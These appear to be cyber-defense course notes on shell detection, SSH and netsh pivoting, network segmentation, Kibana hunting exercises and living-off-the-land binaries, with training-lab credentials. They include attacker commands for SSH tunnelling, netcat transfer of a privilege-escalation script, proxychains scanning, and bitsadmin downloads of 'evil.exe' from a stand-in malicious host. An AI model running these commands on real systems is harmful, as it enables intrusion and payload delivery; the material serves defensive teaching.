UDP 443 (Secure Sockets Layer over HTTP, HTTPS)
TCP 445 (Server Message Block, SMB)
TCP 3389 (Remote Desktop Protocol, RDP)
TCP 8080 (Alternative port for HTTP traffic or for a proxy server)
It is important to remember that no list is exhaustive and they should remember the ports discussed in CDA-B. 

﻿

In an attempt to avoid detection and bypass filtering, attackers may use non-standard listening or connected services or ports. Often attackers use ports that are not commonly related or associated with one another to disturb analysis and the parsing of network data, thus avoiding detection. A standard port for Hypertext Transfer Protocol Secure (HTTPS) is port 443. According to MITRE, an attacker may use ports 8088 or 587 as an alternate non-standard port for a shell.

﻿

Detection
﻿

Detection for non-standard listening or connected services or ports is a straightforward strategy, packets that do not follow typical or expected behavior should be analyzed. Detection engineering is a critical component to discover threat activity. Detection rules that are tripped when non-standard services or ports are used need to be developed, alerting analysts the moment the services or ports are used. Mismatched or unexpected protocols and ports, such as non-encrypted HTTP traffic on port 443, can be automatically identified using a tool such as Security Onion or Zeek.

﻿

Security Onion and Zeek identify the protocol type and do not only rely on the port to determine the type of traffic. Additionally, analysis of the network for data flows where a host sends significantly more data than it receives is a key indicator of potential threat activity. A host sending large amounts of data can be indicative of threat presence on a machine. This is especially the case if the host is utilizing network communications where it is not expected. 


--------------------------------------

Common Shell Activity in Event Logs
Windows event logs are useful to track a user or application's usage and processes. Analysis of event logs aids in the identification and detection of shell activity by identifying connections made by processes on hosts. All hosts on the network need to be configured to audit the success and failure of certain key events through the use of Group Policy Objects (GPO). Below are key events that need to be audited.

﻿

Process Creation

![image](https://github.com/user-attachments/assets/fb338cdf-1a2e-4ac5-86d9-9abe252919d4)

Within the Local Group Policy Editor window, the following path leads to the Audit Process Creation configuration: Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Detailed Tracking > Audit Process Creation. Audit Process Creation, according to Microsoft, determines whether the Operating System (OS) generates audit events when a process is created (starts). The audit events can help track user activity and understand how a computer is being used. Information includes the name of the program or the user that created the process. With regard to interactive shells, Audit Process Creation identifies if cmd.exe was created and/or accessed. The Windows event ID associated with process creation is ID 4688. 


Platform Connection 

![image](https://github.com/user-attachments/assets/ca939d7d-357d-40c3-ba9e-0e32c8b64871)

Within the Local Group Policy Editor window, the following path leads to the Audit Process Creation configuration: Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Object Access > Audit Filtering Platform Connection. Audit Platform Connection, according to Microsoft, determines whether the OS generates audit events when connections are allowed or blocked by the Windows Filtering Platform (WFP). WFP enables Independent Software Vendors (ISV) to filter and modify TCP/IP packets, monitor or authorize connections, filter Internet Protocol Security (IPSec)-protected traffic, and filter Remote Procedure Calls (RPC). This subcategory contains WFP events about blocked and allowed connections, blocked and allowed port bindings, blocked and allowed port listening actions, and blocked to accept incoming connections applications. The Windows event IDs associated with platform connection are ID 5156 (WFP has allowed a connection), 5157 (WFP has blocked a connection), and 5158 (WFP has permitted a bind to a local port).

---------------------------------------------

Suspicious Activity in the VCCH Network
The network team has discovered a few large communications occurring on the city hall network occurring over a 7-day span (Nov 2, 2021 @ 00:00:00.000 -> Nov 10, 2021 @ 00:00:00.000). Large communications are rare, however, as they consume a large amount of bandwidth triggering the network team to investigate. The network team needs the help of security analysts to look into the bandwidth anomalies and determine if the activity is suspicious. Begin by accessing VCCH's Elastic Stack via the use of the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

After accessing the win-hunt VM, access Security Onion and Elastic Stack using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

After accessing Elastic Stack, create a Data Table to aid in the investigation of the questionable network activity. 

-------------------------------------------------------

Investigation | Bucket Setup
Add Buckets to the data table to add information about the hosts for the timespan Nov 2, 2021 @ 00:00:00.000 -> Nov 10, 2021 @ 00:00:00.000, and analyze the results to answer the following questions.

Host name with the domain
Destination IP address
Destination port number
Process name

![image](https://github.com/user-attachments/assets/957268c3-59a6-4051-a4ba-defe3667c95d)

Field Information
The four fields display host name with the domain, process name, destination IP address, and destination port:

host.name.keyword

destination.port

destination.ip

process.name.keyword

![image](https://github.com/user-attachments/assets/c40f009f-10b2-4d67-9a6b-8d19f6617fb3)


![image](https://github.com/user-attachments/assets/de161437-3363-4b89-a867-82e7dc307ef2)

![image](https://github.com/user-attachments/assets/6df87ba9-fe38-441a-bec1-ff19ac66d9ea)

-----------------------------------------

nc.exe Occurrences
Apply a filter to the table to filter by process.name.keyword: nc.exe. The count of nc.exe then becomes visible. 

﻿

Once the count has been obtained, the filter can be removed to return to the data table. 


![image](https://github.com/user-attachments/assets/178bd8d3-6215-4ddc-a5fd-fb74e4a9295e)


Suspicious, Non-Standard, Listening Destination Port 


There are a few suspicious ports within the table (port 4444 and 53, for example); however, 8088 is the focus of this investigation. 

![image](https://github.com/user-attachments/assets/28307023-0c82-4651-bae7-6df07489df99)

Port 8088 was used twice by the Netcat executable. As previously stated, often the adversary uses a non-standard listening port, such as port 8088, to conduct HTTPS traffic. It is important to note that the existence of the Netcat executable may not be suspicious. Netcat can be used to do remote network maintenance across the enterprise. The Netcat executable paired with the non-standard port 8088 is suspicious and cause for investigation. 

----------------------------------------------

Investigation Conclusion
Through the use and analysis of Elastic Stack and Kibana, an outlier data point within network communications has been identified. The outlier is connected via a non-standard port (8088) and a unique IP address (128.0.7.206), relative to the other IP addresses found in the collected logs. The ch-tech-1 VM needs to be further investigated for adversarial persistence and to identify what data may have been compromised through the use of an established shell. 

--------------------------------------------------------

####### CDAH-M8L2-Pivoting #######

Pivoting Overview
Pivoting refers to the concept of an attacker moving from one compromised system, or “foothold,” to another system with the intent of gaining greater access to network resources. Pivoting occurs when the attacker gains access from outside the network and moves within it. Similarly, lateral movement occurs when the attacker gains access from inside the network and moves within it. Pivoting allows attackers to navigate around certain security and detection entities, such as firewalls, to conduct further operations from within the network itself. Pivoting facilitates operations such as the following:

Reconnaissance

Exploitation of hosts and servers

Passive collection

Attackers also employ pivoting outside of the targeted network, when attempting to redirect, or obfuscate, their origins. This pivoting type targets networks that are loosely connected to the targeted network to take advantage of trust relationships between business partners or industries. Defenders must understand the methods, tools, and techniques that attackers use to create footholds and pivot within a network to begin behavior detection and mitigation.

﻿

Why Pivot
﻿

When an attacker gains access to a server or host on the network, they have two primary options to continue their efforts. First, they can survey the compromised device in order to identify assets of interest and opportunities for destructive actions. Possible assets and opportunities include the following:

Ransomware

Collection and exfiltration of proprietary data

Theft of resources

Cryptocurrency mining

Second, the attacker may pivot to other devices or networks. As part of the initial survey of a compromised system, attackers identify adjacent networks or hosts that were previously inaccessible. If the compromised system is in a new network or segment, this allows attackers to conduct reconnaissance from a computer in a remote network. Ideally, the remote network has limited interference from peripheral devices, such as firewalls and routers. This method creates less noise on the network. Creating multiple chains of proxies or pivots makes attributing the actions of the attacker challenging. 

﻿

Common Pivoting Methods
﻿

Pivoting techniques commonly use the SSH protocol since it is typically a known “good” protocol for system administration and is also encrypted. SSH is a secure connection that allows remote administration of hosts and servers through a CLI. By default, SSH servers accept incoming connections on the Transmission Control Protocol (TCP) port 22. The SSH protocol was created as a secure version of Telnet, but with encryption as a priority. SSH has the ability to encapsulate and tunnel other types of traffic through an established connection. When network traffic is sent through the SSH tunnel, it is forwarded to its final destination from that SSH server. Attackers take advantage of this SSH feature and use it as one of the primary communication methods for pivoting. SSH servers are common on the following:

Servers

Network devices

Internet of Things (IoT) devices

The examples described below demonstrate the steps attackers take to create simple SSH pivots within a network.

 

Pivoting Types
﻿

Adversaries have three main options, when selecting the optimal port forwarding pivots. The types of port forwarding pivots include the following:

Local

Remote

Dynamic

The characteristics, features, and use cases of each pivoting type are covered below.  

﻿

Local Port Forwarding
 

Local port forwarding connects a user from the local computer to another server. This is done by the SSH client listening for traffic on a specified local port and when receiving data. In the scenario described below,  SSH tunnel traffic appears to originate from a foothold within the target network, before moving to the remote network device. This scenario is illustrated in Figure 3.2-1.

 

Scenario

 

An attacker wants to access a File Transfer Protocol (FTP) server on port 21 and conduct reconnaissance behind a network firewall. The firewall blocks all FTP traffic and reconnaissance attempts. The attacker compromises a box on the internal network named Foothold1 with Internet Protocol (IP) address 192.168.1.1. The firewall allows web traffic on port 80 to flow freely, as there are several web servers on the network. Since the attacker already has access to Foothold1, one way to bypass the firewall rules is to start an SSH server on port 80.

 

To circumvent the firewall rules, the attacker configures a local port forward connection on Foothold1. The configuration redirects all traffic from local port 6000, on the system which originates the SSH connection, to remote port 21. The configuration then sends the traffic to the FTP server within the target network. The attacker then has the ability to freely access files in the FTP server from their host. All traffic is encapsulated by SSH and unpacked at Foothold1. Once unpacked, the Foothold1 box redirects the traffic to the configured FTP server and sends all corresponding response traffic through the same tunnel to the attacker’s host. 


![image](https://github.com/user-attachments/assets/008f6368-eab1-437f-8850-8f5884509abd)


Remote Port Forwarding
 
Remote port forwarding differs from local port forwarding in that the configured SSH redirect forwards the traffic from the remote SSH server to a specified host. The specified host is often the local system that is running the SSH client. An example is when the attacker has a resource locally that they want to make available on the remote network. The resource includes the following:
Internal phishing server
Tool repository
Command and Control (C2) server
Other exploitation-related resources

Scenario
 
While conducting reconnaissance on the internal network depicted in Figure 8.2-2, the attacker learns that the compromised host Foothold1 is multihomed. Multihoming is the practice of connecting a host to more than one network. Foothold1 is connected to the production network where a MySQL server resides. The attacker gains access to the server and needs additional tools in order to gain elevated privileges. Due to network restrictions, the MySQL server only accesses the network labeled Target Network over port 8080. 


![image](https://github.com/user-attachments/assets/7d3a966a-7453-44ff-894f-34f5fbb428b9)

The code blocks below detail one way an attacker uses tunnels to gain access to remote systems. This example also allows remote systems to have access to resources hosted on the attacker's system.


The first code block, below, creates a tunnel from the attacker's system through Foothold1 to an SSH server on 192.168.2.2 listening on port 22. It also creates a remote tunnel on Foothold1 listening for incoming connection to port 8080 that forwards traffic to the attacker's system on their local port 80.
 
attacker$ ssh -L 6000:192.168.2.2:22 -R 8080:127.0.0.1:80 -p 80 user@192.168.1.1
foothold1$

 
The second code block waits for connections to port 80 on the attacker's system. After a connection is made, it sends the file privesc.sh to the remote system. This block is written as follows:
 
attacker$ nc -l -p 80 < privesc.sh

 
The third code block, below, uses the local tunnel on port 6000 to connect to the SSH server on MySQL on 192.168.2.2. After making this connection, the attacker makes another connection to the remote tunnel on 192.168.1.1 over port 8080. This connection to the remote tunnel uses the reverse tunnel on port 192.168.1.1 and redirects the traffic to port 80 on the attacker's system. The attacker’s system is where the file privesc.sh is then sent to the MySQL server and saved.
 
attacker$ ssh -p 6000 user@127.0.0.1
user@mysqlserver$ nc 192.168.1.1 8080 > privesc.sh



Dynamic Port Forwarding
 
Once attackers compromise a server in the production environment, the next step is to set up dynamic port forwarding. Dynamic port forwarding allows the attacker to create a communication connection point or socket on the MySQL server. This socket is a proxy for the attacker acting as an intermediary for their malicious behavior. The first step for creating the dynamic port forwarding is to create a remote port forward much like the one the attacker just created. The following commands make the initial connections to Foothold1 and mysqlserver.


attacker$ ssh -L 6000:192.168.2.2:22 -p 80 user@192.168.1.1
foothold1$

attacker$ ssh -D 127.0.0.1:9050 -p 6000 user@127.0.0.1
user@mysqlserver$



The option -D creates a dynamic port forwarding that originates from the attacker's local port 9050 through the tunnel to the MySQL server. Traffic sent through the attacker's port 9050 appears to originate from mysqlserver.
 
With the dynamic port forward established, the attacker uses the MySQL server at IP address 192.168.2.2 as a proxy gateway to scan the production network. This is done by using the utility ProxyChains, which provides functionality to forward network traffic through a proxy from tools like Nmap. The following is the command to scan the production network:
 
attacker# proxychains nmap -sn 192.168.2.2/24

 
This tunnel sequence, as illustrated in Figure 8.2-3, is an example of how an attacker obfuscates their path through a network and makes it much harder for defenders to identify compromised hosts.


![image](https://github.com/user-attachments/assets/33457abf-a85e-4155-8fba-823ff4feb676)

-------------------------------------

Tools for Pivoting
Attackers have a wide selection of tools to aid in pivoting. Each tool carries specific features based on the architecture of the target network. This section introduces the following tools that attackers use for pivoting:

Metasploit

Netsh

Netcat

Socat

Ngrok

Metasploit
 

The Metasploit framework contains easy-to-use tools, such as Meterpreter, that pivot inside a network and set up footholds where attackers have compromised network resources. According to Metasploit: 

﻿

“Meterpreter is an advanced, dynamically extensible payload that uses in-memory Dynamic Link Library (DLL) injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby Application Programming Interface (API).”

﻿

Figure 8.2-4 displays a host that was exploited on the network 192.168.0.0/24 using a reverse TCP shell payload.  

![image](https://github.com/user-attachments/assets/5774f670-7983-4c82-9d28-c14a347c19f0)

Within the Meterpreter session, the command ipconfig runs to show that the exploited host is multihomed. The host is connected to both networks 172.16.0.0/24 and 192.168.0.0/24. In this scenario, the attacker does not have access to the 172.16.0.0/24 network from external resources and wants to conduct operations on it, as shown in Figure 8.2-5:

![image](https://github.com/user-attachments/assets/9f280e16-25ff-4312-85b2-5eb8eed9c523)

The attacker creates a port forward from the exploited host so that their traffic is routed through the compromised host and sent to the newly discovered network. This is done using the command autoroute, a post-exploitation feature of Meterpreter that creates a pivot through an existing Meterpreter session. Figure 8.2-6 is the syntax for the command autoroute to be configured for the network 172.16.0.0/24. 

![image](https://github.com/user-attachments/assets/9a545d8e-3d04-4d74-825c-bbd4828808c7)

After creating a pivot on the host 192.168.0.3, the attacker conducts further operations within that network that they were unable to reach before.
 
Netsh
 
Netsh refers to a Windows CLI for configuring network devices. A netsh configuration option has the capability of setting up a port-based proxy between network devices, referred to as a portproxy. A portproxy is a communication channel that listens for incoming network traffic and forwards it to a remote host from a specified port on the host's network interfaces. Portproxy also enables a system to redirect all traffic originally intended for that port to a different port. A pivot technique such as portproxy enables attackers to access hosts that are not directly accessible through the system attacker compromised. 
 
Netcat
 
Netcat is a networking utility that is used to establish and communicate TCP or User Datagram Protocol (UDP) network connections. The adversary uses netcat to create footholds on remotely accessible networks. With netcat, the adversary easily pivots from one compromised machine to another to gain information such as the following: 
IP addresses
Open ports
Available hosts

Additionally, the use of netcat allows the adversary to run scans for found services and web applications.
 
Socat
 
Socat is a networking utility that is for bi-directional communication between two hosts that uses data channels. Socat is sometimes referred to as an “advanced netcat” due to the wider variety of connections it manages. Socat handles relevant data channels that include the following:
Files
Pipes
Devices (serial line, pseudo-terminal, etc.)
Sockets (UNIX, IP4, IP6 - raw, UDP, TCP)
Secure Sockets Layer (SSL) sockets
Proxy CONNECT connections
File descriptors (stdin, etc)
The GNU line editor (readline)
Programs
Combinations of two of these

Attackers often use Socat's capabilities in routine socket redirections to pivot. They may also use its less common features to create complex communication channels that are extremely stealthy and difficult to detect.
 
Ngrok
 
Ngrok is a developer tool designed to aid in testing connectivity and functionality for network-based applications. Ngrok allows local services to be accessible on the internet, even if the services sit behind Network Address Translation (NAT) or a firewall. The internet accessibility also means that it makes any port on a local computer accessible through a secure tunnel from the internet. Ngrok is easily leveraged by the adversary to reach services and ports that otherwise are not accessible.

------------------------------------------

Pivoting Using Netsh Portproxy
Walk through pivoting by setting up a portproxy between the attacker host and a host configured to use another network. This workflow uses three hosts to demonstrate pivoting using portproxy. The hosts and their IP addresses are:

Attacker host red-kali: 128.0.7.205

ch-tech-1 workstation: 172.35.13.2 and 10.10.13.2

ch-tech-3 workstation: 10.10.13.4

The attacker host has connectivity to the workstation ch-tech-1 on the network 172.35.13.0/24. Ch-tech-1 has connectivity from the network 128.0.7.0/24, through the internet, and to the network 10.10.13.0/24. The workstation ch-tech-3 only has connectivity to the network 10.10.0.0/16. This design does not enable the attacker host to directly connect to the workstation ch-tech-3. Pivoting using portproxy bridges the two networks and enables reconnaissance from the Attacker host and ch-tech-3 workstation.

﻿------------------------------------

 
Network Segmentation as a Pivoting Mitigation
The design and architecture of a network can mitigate exploitation through pivoting. Below are devices and designs that aim to separate a network's components, with the goal of providing greater security. 

﻿

Layer 2 Devices
﻿

The bridge is a fundamental Layer 2 device in ethernet networks that facilitates communication between multiple devices. Bridges provide basic network segmentation by examining the destination MAC address of each incoming frame and selectively forwarding it to the appropriate port. While bridges are still found in some networks where their specific features are advantageous, their usage is limited due to the issues they present, including the following:﻿

In complex network environments, bridges can introduce additional latency and overhead.

Bridges have limited capabilities compared to switches in terms of creating distinct and granular network segments.

Bridges lack advanced security features found in modern switches making them more vulnerable to exploitation.

Similar to bridges, switches facilitate connectivity between devices. However, unlike bridges, switches use logic to determine which ports to forward frames onto. Switching logic and MAC address tables are covered later in this lesson.

﻿

Basic switches exist that perform only the bare minimum of switching to ensure that collisions do not occur frequently and ensure basic addressing. These switches, sometimes referred to as unmanaged switches, are found in small business and home networks and even used in some enterprise networks. However, managed switches are typically used in enterprise networks, especially for central connectivity within the network. System administrators configure and support more features for these switches, such as the ability to mirror ports or create VLANs to segregate networks. 

﻿

LAN Overview
﻿

A LAN is comprised of devices communicating in a defined or limited area, such as an office, house, or business. LANs generally are small in size and consist of a minimum number of devices. Common devices found in a LAN are bridges, routers, and switches. In a LAN, packets are advertised to each device, meaning every device in the network receives packets being transported within the network. A LAN design means resources are allocated exclusively to that LAN, so they can have high delivery speeds. However, the devices only operate for that LAN. A LAN is at a much higher risk for compromising. This is because there are very few devices or checks left in the way of hosts, once the adversary accesses the network.

﻿

VLAN Overview
﻿

A VLAN comprises devices connected by bridges and switches that are designed to communicate together as one single local area network (LAN), even though they operate separately. A VLAN's design enables network segmentation, meaning a bridge or switch is used to connect and open communication paths for devices found in different network areas. In a VLAN, packets are sent to a specific, unique, broadcast domain, so the packet is only communicated to the intended devices. From a security perspective, hosts located on separate VLANs are compartmentalized, requiring adversaries to access multiple devices to reach each host. From an infrastructure perspective, VLANs improve the utilization of resources. These resources do not need to be exclusively dedicated to a single LAN. 

﻿

Network Segmentation
﻿

Network segmentation is the primary mitigation strategy for pivoting. When an adversary compromises a host on the network, the next steps include scanning or attempting to see other devices, information, or hosts in range. By segmenting a network, the location or segment of these devices, information, or hosts are in different locations on the network. This means they are not easily visible or accessible to the adversary. Without network segmentation implemented, an adversary that gains access to the network easily pivots between devices or hosts searching for sensitive data. 

﻿

Demilitarized Zone (DMZ)
﻿

A DMZ is a perimeter sub-network (or “subnet”), located between private networks and the public internet. A DMZ's primary goal is regulation of traffic in between the private network and the internet. The DMZ ensures that only expected or allowed traffic is flowing in and out of the private network, keeping the LAN secure. Common servers or resources found in a DMZ include: 

Domain Name System (DNS)

FTP

mail servers

web servers

A key design element of the DMZ is the location of the servers or resources in an area where they access the internet but have a limited, minimal level of LAN. Using a DMZ helps mitigate pivoting because of its segmented nature. A DMZ is positioned away from the LAN and has minimal communications. Additionally, a firewall typically sits between the DMZ and the LAN. If the DMZ gets compromised, the firewall keeps the LAN secure.

![image](https://github.com/user-attachments/assets/2e3f3193-5c14-4682-8d9f-d157d264588f)


-----------------------------------


Pivoting Detection Methods
Pivoting is one of the most challenging activities to detect. A key component of pivoting is command propagation, where attackers tunnel through two or more hosts in order to reach their final target. Defenders cannot detect command propagation through signatures, data, or artifacts created as a result of the activity. There is a large amount of research into the creation of algorithms to better detect pivoting and alleviate the resources required to detect pivoting. Network traffic is the basis for detection algorithms that review the traffic and assign a score based on the perceived threat level. Outside of the research into algorithms, pivoting detection includes analysis of traffic paths and reconnaissance activities. The following are basic pivoting detection strategies:

Path novelty

Reconnaissance activities

Hunt artifacts

Path Novelty 
﻿

Path novelty is one component that can be detected when pivoting occurs. Path novelty is the creation of new paths or communications. Traffic paths created between hosts that may have not previously occurred may be a signal that the attacker has pivoted to a new host. The traffic paths include network activity, data transfers, and requests. This detection method applies to hosts that communicate infrequently. When hosts see an unexpected uptick in traffic, this activity must be investigated. 

﻿

Reconnaissance Activities
﻿

Observing reconnaissance activities coming from within the network may provide data points that, when analyzed, indicate pivoting has occurred. 

﻿

MITRE ATT&CK® describes reconnaissance as follows:

“Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.”

﻿

Activities connected to reconnaissance include: 

Scanning active networks.

Gathering host information, such as IP addresses, names, and email addresses.

Connecting to new or uncommon ports.

Hunt Artifacts
﻿

Artifacts in a hunt include Sysmon events and Windows Event Identifiers (ID). Table 8.2-1 lists the IDs to consider when approaching a hunt that may include pivoting:

![image](https://github.com/user-attachments/assets/afc2601a-0ee9-4913-8e86-880fbf4a8144)


![image](https://github.com/user-attachments/assets/00a4f10d-c28e-4df7-a631-0b3bda742773)


-------------------------------

     Detect Pivoting
Read the scenario below, then apply the knowledge and skills from this lesson in the following workflow.

﻿

Scenario

﻿

The Virtual City City Hall (VCCH) network needs help in detecting if there are any occurrences of potentially Malicious Cyberspace Activity (MCA) on the network. Use Kibana to determine if MCA occurred and if there is a need to investigate further.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Google Chrome and select either bookmark: Visualize - Elastic or Discover - Elastic.

 

3. In Security Onion, enter the following credentials: 

Username: trainee@jdmss.lan
Password: CyberTraining1!
 

4. Use the following information to determine if MCA occurred:

Set the timespan to February 3, 2022 @ 00:00:00.000 > February 8, 2022 @ 23:30:00.000.
Query all data against the *:so* index. 
Use the investigation in this workflow to answer the following questions.     

netsh makes uses registry

![image](https://github.com/user-attachments/assets/0559e2bc-e68c-44bf-bc68-2255b5f94f9e)

Pivoting Artifacts
Pivoting is one of the most challenging techniques to detect. Often when an attacker pivots in a network, there are few artifacts that immediately make the pivot apparent. One manipulation location that leads to evidence is a host's registry. The registry is a database containing defined settings for the host. 

﻿

winlog.event_data.TargetObject 
﻿

The field winlog.event_data.TargetObject is useful for querying based on registry change. Collected by Winlog Beat, winlog.event_data.TargetObject allows for querying of accessed or manipulated objects. 

![image](https://github.com/user-attachments/assets/919f6f79-6428-41ad-90cc-9a27798aa398)

![image](https://github.com/user-attachments/assets/df3a3c79-5dad-4697-ba09-62fc71b14d39)


![image](https://github.com/user-attachments/assets/746e30d9-7eac-4166-b3c3-7e742fa55f2d)

--------------------------------------

Querying for Pivoting
A port proxy is a communication channel that allows users to listen on a defined port on the host's network interfaces. Port proxy also enables users to redirect all traffic originally intended for that port, to a different port. The adversary uses netsh to access hosts that are not directly accessible through the machine they compromised.


![image](https://github.com/user-attachments/assets/d8406233-8afb-4ea0-8dc6-14216ad09708)
![image](https://github.com/user-attachments/assets/675dfa12-85ae-42bf-b779-87d560f50b98)


Port Proxy
As shown by the data table in Figure 8.2-18, there are two IP addresses associated with the port proxy.

![image](https://github.com/user-attachments/assets/58897460-50f5-45ae-9f7e-9a3104f88ecb)

![image](https://github.com/user-attachments/assets/9422d1c2-001d-4726-abe9-33feb44251b9)

![image](https://github.com/user-attachments/assets/c64b65a9-cad5-4c3a-a16e-3dcd056ae400)

![image](https://github.com/user-attachments/assets/59a645e7-6f9a-47d1-83e9-fa03120330cb)

![image](https://github.com/user-attachments/assets/f7cf9bf0-8108-4633-aec4-b51b6d6811cf)


Investigation Summary
The data table in Figure 8.2-19 displays that the host ch-tech-1 experienced the port proxy activity in the system's registry. The host ch-tech-1 experienced Sysmon event IDs 12 and 13, indicating changes to the registry. This traffic is the only one of its kind to occur on a host in the network, over the week's timespan. 

![image](https://github.com/user-attachments/assets/e96790af-53c2-40da-a118-aeb4bbad6cf8)

Taking the information gathered using the data table, an analyst should then query the Discover page with the results displayed in Figure 8-2.20:
 
![image](https://github.com/user-attachments/assets/3607b656-cb6b-4404-9414-f7d344e99ebf)

The registry activity that occurred on the host ch-tech-1 is an anomaly. The registry was manipulated in a way that is unusual and may be associated with MCA using the pivoting technique. Additionally, the host was accessed through port 1337, which is not normally associated with legitimate TCP traffic. The host, the accounts, and the surrounding hosts need to be analyzed to determine how initial access was made, what movement was done, and if any data was stolen.

--------------------------------------

#### CDAH-M9L1 Living off the Land ####

Living off the Land Methodology
Living off the Land Binaries (LOLBin) refers to any executables that are already part of the OS. This concept can be extended to the use of scripts, libraries, and software, which includes Living off the Land (LOL) Binaries and Scripts (BAS) (LOLBAS). LOLBins are legitimate utilities, such as Windows PowerShell.exe, bitsadmin.exe, certutil.exe, and psexec.exe.

﻿

Increasingly used by malicious agents, these executables become attractive by giving attackers the ability to bypass security mechanisms and deliver malicious files or payloads without the need to modify or create objects within the file system or through processes already running on the device. A LOLBin becomes attractive to adversaries when functionality offered by the utility can be reused for MCA and allows this behavior to blend into other regular user activities while remaining hidden because its execution is apparently initially benign.

﻿

The behavior of these utilities can be overlooked by traditional users and administrators, mainly due to their legitimate bias when not identifying a change that characterizes atypical system activity.

﻿

Threat actors write malware that makes use of the most common executables for Windows environments, such as PowerShell scripts and msiexec, which executes Microsoft Installer (MSI) packages, and psexec utilities, which are used to execute arbitrary code and commands. In Unix-like environments, such commands as openssl or such script interpreters as Python can be invoked in a terminal to load files, libraries, or execute commands to escalate privileges.


----------------------------------------


Multifunctional Binaries
Throughout the action of a reconnaissance, persistence, or privilege escalation post-compromise attack, the following utilities and frameworks, when present and available to the attacker, are useful: 

PowerShell
Bash
WMIC
VBScript
PowerShell
﻿

PowerShell is the scripting language used for all types of administrative tasks in Windows OSs. It is built on top of the Windows native runtime environment and seamlessly integrates with it, allowing for functionality with the Component Object Model (COM) architecture that underlies much of the Windows OS. This makes reading and writing to all manner of files, system information, networking, domain interaction, and other objects relatively easy for those familiar with the necessary architecture and syntax. 

﻿

It is important to restrict access to this resource to only users who are administering information systems in the domain. Even with limited access, apply other security best practices, such as restricted ExecutionPolicy to prevent the execution of malicious scripts, disabling PowerShell version 2.0, and setting the lockdown policy to Constrained LanguageMode. Several of these mitigations are discussed later.

﻿

Bash
﻿

The Bash environment and scripting engine are traditionally present on Linux systems but are now included with the Windows Subsystem for Linux (WSL) on many modern Microsoft distributions. As a result, Bash is yet another process available on Windows that allows for a highly diverse range of functions and effects.

﻿

WMIC
﻿

Windows Management Instrumentation Console (WMIC) is a Windows administration tool that, like PowerShell, is built to directly interface with the underlying Windows architecture. In the Cyber Defense Analyst – Basic (CDA-B) course, WMIC was used to interact with and manage COM objects.

﻿

VBScript
﻿

Visual Basic Scripting Engine (VBScript), while not a binary, is a legacy scripting language that has been marked as deprecated by Microsoft but continues to come installed by default. It is typically launched by the binaries cscript.exe or wscript.exe. While PowerShell has replaced VBScript for most scripted administration, these scripts may still be used in Windows environments where PowerShell is not installed, when administrators do not change legacy scripts already in place, or when adding custom functions to MSI installers, which do not support PowerShell scripting.

﻿
----------------------------------

Living off the Land | Windows
Initial Situational Awareness and Reconnaissance
﻿

When an adversary initially gains command execution on a machine, a common pattern is to determine what type of device the actor has access to, what other devices may be accessed from it, and in what context and permissions that actor is currently operating. These types of basic initial checks are known as situational awareness checks. They frequently include the following types of commands:

﻿

Running Processes and Services
﻿

The following commands list which processes and services are running on the system at the time of execution:

tasklist: Shows running processes.

qprocess: Shows running processes.

net start: Shows started services.

sc: Shows started services.

Networking
﻿

The following commands are used to gather information about a system’s networking environment, such as addresses, neighbors, and connections:

ipconfig: Shows active network interfaces.

netstat: Shows established, listening, and waiting network connections.

ping: Determines connectivity to other network devices.

netsh: Displays firewall information.

tracert: Determines network distance (number of hops) to other hosts.

arp: Shows local ARP database, which potentially reveals directly adjacent network devices.

Data
﻿

The following commands reveal information about files and folders available locally or remotely:

dir: Shows a list of the current or specified folder and all subfolders and files within.

net share: Shows which folders are shared out by the host machine.

net view: Shows resources shared out by domain machines.

icacls: Lists access permissions associated with files and folders.

attrib: Displays attributes of files and folders.

System Information
﻿

The commands below display information about the OS and how it is configured: 

ver: Shows the OS version.

hostname: Shows canonical name of the system.

systeminfo: Shows more detailed information about the system configuration.

net time: Displays standardized network time.

driverquery: Shows information for drivers installed on a system.

NOTE: Because systeminfo displays which security patches have been installed, it is a risk to allow non-administrator users to run it, though it can appear to be easier from a helpdesk perspective. Network owners may restrict the usage of this binary from non-administrator users using Microsoft’s AppLocker. 

﻿

User Information
﻿

The following commands reveal information about the current user, logged-on users, and other users on a system: 

whoami: Shows current user, and attributes of that user.

net user: Shows all local and domain accounts.

net localgroup: Shows which users belong to local groups.

query user: Shows users with current sessions. 

NOTE: For each of these initial reconnaissance functions, at least one PowerShell cmdlet exists that provides the same information. The details on such cmdlets is covered in earlier courses and later lessons in this course. 

﻿

Many of these commands may be run in ordinary administrative contexts or by a user performing minor troubleshooting, or even in scripted tasks. It is rare that the entire set of commands is run in short succession by a normal user. Therefore, detection of the reconnaissance using this methodology is most logically executed by alerting on a series of commands such as these executed in short succession, as if performed by a reconnaissance script.

﻿

Workflow

﻿

To see what sort of information an attacker can discover about a machine with simple command execution on it, log in to a Windows domain machine and run a reconnaissance script that has been prepared with several of these commands.


---------------------------------------------------------

Data Ingress Binaries
One of the most important operations for an adversary in a post-compromise environment is the ability to ingress (bring into an environment) additional tools and scripts. This data can travel over Hypertext Transfer Protocol (HTTP), HTTP Secure (HTTPS), File Transfer Protocol (FTP), FTP Secure (FTPS/SFTP), Trivial FTP (TFTP), or any other stateful connection protocols present on a mission partner environment that would not raise suspicion when traffic communicates over it. The following binaries that preexist in the Windows OS can be used for this function:

BITSAdmin

Certutil

FTP

TFTP

The multiphase utilities previously mentioned

BITSAdmin
﻿

BITSAdmin provides command-line access to the ​​Background Intelligent Transfer Service (BITS), which is used for web or Server Message Block (SMB) file downloads or uploads by developers and system administrators. This tool is used to create, download, or upload BITS jobs and to monitor their progress. The BITSAdmin tool uses switches to identify the work to perform. Most switches require a <job> parameter, which is set to the job's display name and does not have to be unique. By default, a user can access information about their own jobs, but to see other users’ jobs requires administrator privileges.

﻿

Two types of syntax exist for this type of file transfer: 

bitsadmin /transfer job1 http://malicious/evil.exe c:\users\public\notevil.exe
﻿

bitsadmin /create job1 & bitsadmin /addfile job1 https://www.malicious.com/evil.exe c:\users\public\notevil.exe
 & bitsadmin /RESUME job1 & bitsadmin /complete job1
Certutil
﻿

This binary was originally designed to manage, update, and download certificates. This functionality has been appropriated by attackers to download a file rather than just certificates.

﻿

